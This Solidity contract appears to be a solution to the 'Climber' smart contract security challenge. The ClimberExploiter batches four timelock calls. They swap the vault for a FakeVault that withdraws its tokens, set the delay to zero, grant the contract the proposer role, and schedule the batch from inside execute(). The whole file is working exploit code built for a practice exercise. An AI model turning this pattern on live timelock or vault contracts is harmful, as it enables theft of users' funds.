// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

import {PROPOSER_ROLE} from "../../src/climber/ClimberConstants.sol";
import {ClimberTimelock} from "../../src/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {FakeVault} from "./FakeVault.sol";

contract ClimberExploiter {
    ClimberTimelock private _timelock;

    address[] private _targets = new address[](4);
    uint256[] private _values = [0, 0, 0, 0];
    bytes[] private _dataElements = new bytes[](4);

    constructor (address timelock, address vault, address token, address recovery) {
        _timelock = ClimberTimelock(payable(timelock));

        // proposal_1: Upgrade vault
        _targets[0] = vault;
        _dataElements[0] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(new FakeVault()),
            abi.encodeWithSignature("emergencyWithdraw(address,address)", token, recovery)
        );

        // proposal_2: Set Update Delay to 0
        _targets[1] = timelock;
        _dataElements[1] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        // proposal_3: Grant proposer role to timelock
        _targets[2] = timelock;
        _dataElements[2] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        // proposal_4: Call schedule() on timelock
        _targets[3] = address(this);
        _dataElements[3] = abi.encodeWithSignature(
            "timelockSchedule()"
        );
    }

    function exploit() external {
        _timelock.execute(_targets, _values, _dataElements, keccak256("123"));
    }

    function timelockSchedule() external {
        _timelock.schedule(_targets, _values, _dataElements, keccak256("123"));
    }
}